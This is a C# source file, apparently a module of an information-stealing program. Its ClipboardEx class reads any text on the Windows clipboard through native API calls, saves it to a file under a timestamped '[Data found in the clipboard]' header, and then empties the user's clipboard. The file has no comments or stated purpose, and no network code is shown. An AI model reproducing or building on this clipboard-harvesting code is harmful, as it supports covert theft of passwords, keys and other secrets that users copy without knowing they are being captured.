namespace PEngine.Main
{
    using PEngine.Helpers;
    using System;
    using System.Runtime.InteropServices;
    using System.Threading;
    using System.Windows.Forms;

    internal static class ClipboardEx
    {
        private const uint CF_UNICODETEXT = 0xD;

        private static string GetText()
        {
            if (!NativeMethods.IsClipboardFormatAvailable(CF_UNICODETEXT))
            {
                return null;
            }
            if (!NativeMethods.OpenClipboard(IntPtr.Zero))
            {
                return null;
            }

            string data = null;

            IntPtr hGlobal = NativeMethods.GetClipboardData(CF_UNICODETEXT);
            if (!hGlobal.Equals(IntPtr.Zero))
            {
                IntPtr lpwcstr = NativeMethods.GlobalLock(hGlobal);
                if (!lpwcstr.Equals(IntPtr.Zero))
                {
                    try
                    {
                        data = Marshal.PtrToStringUni(lpwcstr);
                        NativeMethods.GlobalUnlock(lpwcstr);
                    }
                    catch { }
                }
            }
            NativeMethods.CloseClipboard();
            return data;
        }

        public static void GetBuffer(string Buffer)
        {
            try
            {
                if (Clipboard.ContainsText() && GetText() != null)
                {
                    SaveData.SaveFile(Buffer, $"[Data found in the clipboard] - [{DateSet("MM.dd.yyyy - HH:mm:ss")}]\r\n\r\n{GetText()}\r\n\r\n");
                    NativeMethods.EmptyClipboard();
                }
            }
            catch (ExternalException) { }
            catch (ThreadStateException) { }
        }

        private static string DateSet(string time)
        {
            try
            {
                return DateTime.Now.ToString(time);
            }
            catch { return null; }
        }
    }
}